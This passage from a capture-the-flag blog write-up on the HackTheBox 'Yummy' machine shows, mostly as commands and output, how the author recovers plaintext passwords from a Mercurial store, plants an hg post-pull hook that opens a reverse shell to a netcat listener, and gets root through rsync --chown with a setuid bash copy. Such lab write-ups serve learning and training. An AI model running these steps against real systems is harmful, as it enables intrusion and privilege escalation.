+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">www-data@yummy:~/app-qatesting/.hg/store/data$ strings app.py.i</span><br><span class="line">strings app.py.i</span><br><span class="line">`_ MO</span><br><span class="line">\WQP]</span><br><span class="line">Z:L*<span class="string">&quot;</span></span><br><span class="line"><span class="string">3F9]</span></span><br><span class="line"><span class="string">(rN[9</span></span><br><span class="line"><span class="string">_h=R</span></span><br><span class="line"><span class="string">i+Bbq</span></span><br><span class="line"><span class="string">Y*u-9</span></span><br><span class="line"><span class="string">&#123;&lt;eO&gt;</span></span><br><span class="line"><span class="string">DL<span class="variable">$Pb2a</span></span></span><br><span class="line"><span class="string">&gt;]*+E5</span></span><br><span class="line"><span class="string">GM&#123;b</span></span><br><span class="line"><span class="string">^,&amp;9</span></span><br><span class="line"><span class="string">Qy_f</span></span><br><span class="line"><span class="string">Ook2`</span></span><br><span class="line"><span class="string">C*0T</span></span><br><span class="line"><span class="string">O#qP8&amp;8`tL</span></span><br><span class="line"><span class="string">E=Y-;</span></span><br><span class="line"><span class="string">`d30</span></span><br><span class="line"><span class="string">7:C)c</span></span><br><span class="line"><span class="string">,=11)CJ&#125;</span></span><br><span class="line"><span class="string">nVE&#125;</span></span><br><span class="line"><span class="string">Z`[(_</span></span><br><span class="line"><span class="string">p~%+!</span></span><br><span class="line"><span class="string">b6fX</span></span><br><span class="line"><span class="string">`xlS</span></span><br><span class="line"><span class="string">0G&#x27;W</span></span><br><span class="line"><span class="string">ZD8H1</span></span><br><span class="line"><span class="string">Ffa]</span></span><br><span class="line"><span class="string">4bHQ</span></span><br><span class="line"><span class="string">UO:H/</span></span><br><span class="line"><span class="string">Vbm7piL</span></span><br><span class="line"><span class="string">M~&#125;&#123;</span></span><br><span class="line"><span class="string">d!Q0</span></span><br><span class="line"><span class="string">w8 %</span></span><br><span class="line"><span class="string">67*o</span></span><br><span class="line"><span class="string">a*1^</span></span><br><span class="line"><span class="string">DQkX</span></span><br><span class="line"><span class="string">tvGq</span></span><br><span class="line"><span class="string">|YC^,2</span></span><br><span class="line"><span class="string">t[QRpn@/S</span></span><br><span class="line"><span class="string">&gt;ody</span></span><br><span class="line"><span class="string">&#x27;app.secret_key = s.token_hex(32)</span></span><br><span class="line"><span class="string">T sql = f&quot;</span>SELECT * FROM appointments WHERE_email LIKE %s<span class="string">&quot;</span></span><br><span class="line"><span class="string">#md5</span></span><br><span class="line"><span class="string">9    &#x27;user&#x27;: &#x27;chef&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;password&#x27;: &#x27;3wDo7gSRZIwIHRxZ!&#x27;,</span></span><br><span class="line"><span class="string">V([Q</span></span><br><span class="line"><span class="string">&gt;GQ$</span></span><br><span class="line"><span class="string">6    &#x27;user&#x27;: &#x27;qa&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;password&#x27;: &#x27;jPAd!XQCtn8Oc@2B&#x27;,</span></span><br><span class="line"><span class="string">P8*p</span></span><br><span class="line"><span class="string">kwJj</span></span><br><span class="line"><span class="string">d[I&#125;)u</span></span><br><span class="line"><span class="string">^+Wq@</span></span><br><span class="line"><span class="string">$       JJKx8</span></span><br><span class="line"><span class="string">D&#x27;&lt;a</span></span><br><span class="line"><span class="string">www-data@yummy:~/app-qatesting/.hg/store/data$</span></span><br></pre></td></tr></table></figure></div>
+<p><code>qa:jPAd!XQCtn8Oc@2B</code><br>We ssh to it and we get our user flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">qa@yummy:~$ <span class="built_in">id</span></span><br><span class="line">uid=1001(qa) gid=1001(qa) <span class="built_in">groups</span>=1001(qa)</span><br><span class="line">qa@yummy:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">1e45a3b6600f0a493c9c78643e2c01d5</span><br><span class="line">qa@yummy:~$</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>Seeing what we can run as sudo using qa:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qa@yummy:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> qa:</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> qa on localhost:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User qa may run the following commands on localhost:</span><br><span class="line">    (dev : dev) /usr/bin/hg pull /home/dev/app-production/</span><br><span class="line">qa@yummy:~$</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we can run <code>/usr/bin/hg</code> which is the executable for Mercurial, a distributed version control system.</p>
+<p>So what I’ll do now with this is creating a local .hg directory in &#x2F;tmp and ensure it is writable -&gt;Copy and edit the Mercurial configuration file (.hg&#x2F;hgrc) to include a malicious hook -&gt; Prepare a reverse shell script (&#x2F;tmp&#x2F;revshell.sh) that initiates an outbound connection to my local machine -&gt; Trigger the hook by running a Mercurial command (hg pull) as the dev user, which causes the reverse shell script to execute:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">qa@yummy:/tmp$ <span class="built_in">mkdir</span> .hg</span><br><span class="line">qa@yummy:/tmp$  <span class="built_in">chmod</span> 777 .hg</span><br><span class="line">qa@yummy:/tmp$ <span class="built_in">cp</span> ~/.hgrc .hg/hgrc</span><br><span class="line">qa@yummy:/tmp$ <span class="built_in">cat</span> .hg/hgrc</span><br><span class="line"><span class="comment"># example user config (see &#x27;hg help config&#x27; for more info)</span></span><br><span class="line">[ui]</span><br><span class="line"><span class="comment"># name and email, e.g.</span></span><br><span class="line"><span class="comment"># username = Jane Doe &lt;jdoe@example.com&gt;</span></span><br><span class="line">username = qa</span><br><span class="line"></span><br><span class="line"><span class="comment"># We recommend enabling tweakdefaults to get slight improvements to</span></span><br><span class="line"><span class="comment"># the UI over time. Make sure to set HGPLAIN in the environment when</span></span><br><span class="line"><span class="comment"># writing scripts!</span></span><br><span class="line"><span class="comment"># tweakdefaults = True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># uncomment to disable color in command output</span></span><br><span class="line"><span class="comment"># (see &#x27;hg help color&#x27; for details)</span></span><br><span class="line"><span class="comment"># color = never</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># uncomment to disable command output pagination</span></span><br><span class="line"><span class="comment"># (see &#x27;hg help pager&#x27; for details)</span></span><br><span class="line"><span class="comment"># paginate = never</span></span><br><span class="line"></span><br><span class="line">[extensions]</span><br><span class="line"><span class="comment"># uncomment the lines below to enable some popular extensions</span></span><br><span class="line"><span class="comment"># (see &#x27;hg help extensions&#x27; for more info)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># histedit =</span></span><br><span class="line"><span class="comment"># rebase =</span></span><br><span class="line"><span class="comment"># uncommit =</span></span><br><span class="line">[trusted]</span><br><span class="line"><span class="built_in">users</span> = qa, dev</span><br><span class="line"><span class="built_in">groups</span> = qa, dev</span><br><span class="line">qa@yummy:/tmp$ nano .hg/hgrc</span><br><span class="line">qa@yummy:/tmp$ nano revshell.sh</span><br><span class="line">qa@yummy:/tmp$ <span class="built_in">chmod</span> +x revshell.sh</span><br><span class="line">qa@yummy:/tmp$ sudo -u dev /usr/bin/hg pull /home/dev/app-production/</span><br><span class="line">pulling from /home/dev/app-production/</span><br><span class="line">searching <span class="keyword">for</span> changes</span><br><span class="line">no changes found</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>I added </p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hooks]</span><br><span class="line">post-pull = /tmp/revshell.sh</span><br></pre></td></tr></table></figure></div>
+<p> to the config file<br>And we got a callback:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\0xkujen&gt; nc -lvnp 9001</span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.10.16.8] from (UNKNOWN) [10.129.195.32] 43992</span><br><span class="line">I<span class="string">&#x27;m out of office until February 22th, don&#x27;</span>t call me</span><br><span class="line">dev@yummy:/tmp$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(dev) gid=1000(dev) <span class="built_in">groups</span>=1000(dev)</span><br><span class="line">dev@yummy:/tmp$</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>As dev, we can run this command as root:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dev@yummy:/tmp$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> dev on localhost:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User dev may run the following commands on localhost:</span><br><span class="line">    (root : root) NOPASSWD: /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/* /opt/app/</span><br><span class="line">dev@yummy:/tmp$</span><br></pre></td></tr></table></figure></div>
+
+<p>rsync is a powerful tool widely used for synchronizing files and directories either locally or between remote systems.</p>
+<p>A direct privesc idea I got is to copy the bash binary to the app-production folder and run the rsync command on with the <code>chown</code> flag and then executes it with high privs:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">dev@yummy:~$ <span class="built_in">cp</span> /bin/bash app-production/bash</span><br><span class="line"><span class="built_in">cp</span> /bin/bash app-production/bash</span><br><span class="line">dev@yummy:~$ <span class="built_in">chmod</span> u+s app-production/bash</span><br><span class="line"><span class="built_in">chmod</span> u+s app-production/bash</span><br><span class="line">dev@yummy:~$ sudo /usr/bin/rsync -a --exclude=.hg /home/dev/app-production/* --<span class="built_in">chown</span> root:root /opt/app/</span><br><span class="line">sudo /usr/bin/rsync -a --exclude=.hg /home/dev/app-production/* --<span class="built_in">chown</span> root:root /opt/app/</span><br><span class="line">dev@yummy:~$ /opt/app/bash -p</span><br><span class="line">/opt/app/bash -p</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(dev) gid=1000(dev) euid=0(root) <span class="built_in">groups</span>=1000(dev)</span><br><span class="line"><span class="built_in">cat</span> /root/root.txt</span><br><span class="line">8a7af24478c6109367cbc4402f446f48</span><br></pre></td></tr></table></figure></div>
+
+<p>And we got our root flag!!<br>That was it for Yummy, hope you learned something new!<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Yummy</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2025-02-21 11:13:21</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-02-21 18:49:02
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2025/02/21/Hackthebox-Yummy/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/02/14/Hackthebox-Cicada/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Cicada</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Yummy</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-yummy-htb"><span class="nav-text">Web Application - http:&#x2F;&#x2F;yummy.htb </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation"><span class="nav-text">Privilege Escalation</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
